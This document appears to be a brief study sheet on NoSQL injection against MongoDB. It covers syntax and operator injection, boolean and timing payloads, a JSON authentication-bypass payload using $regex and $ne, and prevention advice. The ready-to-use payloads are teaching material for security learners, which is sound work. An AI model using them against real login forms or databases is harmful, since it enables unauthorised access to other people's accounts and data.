# NoSQL Injection Quick Revision

## Definition

NoSQL injection allows attackers to manipulate NoSQL database queries through user-controlled input.

---

# Types

### Syntax Injection

Breaks query syntax.

---

### Operator Injection

Injects MongoDB operators into queries.

---

# Common Operators

```text
$where
```

```text
$ne
```

```text
$in
```

```text
$regex
```

---

# Boolean Payloads

False

```text
' && 0 && 'x
```

True

```text
' && 1 && 'x
```

Always True

```text
'||'1'=='1
```

---

# Authentication Bypass

```json
{
  "username":{"$regex":"admin.*"},
  "password":{"$ne":""}
}
```

---

# Data Extraction

Determine:

- Field names
- Password length
- Password characters

---

# Timing Payload

```json
{
  "$where":"sleep(5000)"
}
```

---

# Prevention

- Validate user input.
- Sanitize user input.
- Use parameterized queries.
- Apply allowlists for accepted operators and keys.

---

# One-Minute Summary

NoSQL injection occurs when user-controlled input modifies NoSQL database queries. The PortSwigger methodology demonstrates syntax injection, operator injection, authentication bypass, field enumeration, character-by-character data extraction, and timing-based testing. Effective prevention combines input validation, parameterized queries, and restricting accepted MongoDB operators.